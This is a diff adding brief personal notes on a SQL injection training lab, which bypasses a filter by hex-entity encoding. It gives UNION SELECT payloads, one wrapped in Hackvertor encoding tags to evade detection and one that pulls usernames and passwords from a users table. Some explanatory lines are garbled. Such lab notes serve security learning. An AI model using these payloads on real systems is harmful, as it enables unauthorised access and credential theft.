@@ -1,0 +1,15 @@
+Lab #17 - SQL injection with filter bypass via XML encoding
+
+
+End Goal: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.
+
+Analysis:
+
+1 UNION SELECT NULL -> if attack detected, then use hackvertor
+
+<@hex_entities>1 UNION SELECT NULL<@/hex_entities> 
+-> IF figure of unit display meaning column exist
+-> If no figure of unit display meaning no additional column
+
+
+1 UNION SELECT username || '~'  || password  FROM users
